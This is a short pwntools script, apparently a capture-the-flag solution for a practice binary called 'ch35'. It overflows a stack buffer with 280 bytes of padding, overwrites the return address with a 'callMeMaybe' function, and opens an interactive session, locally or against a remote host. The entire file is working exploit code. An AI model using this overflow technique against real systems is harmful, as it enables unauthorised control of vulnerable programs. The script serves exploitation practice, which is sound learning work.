from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./ch35"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

padding = 280

payload = flat(
    padding * b'A',
    elf.sym['callMeMaybe']
)

# write('payload', payload)

io.sendline(payload)

io.interactive()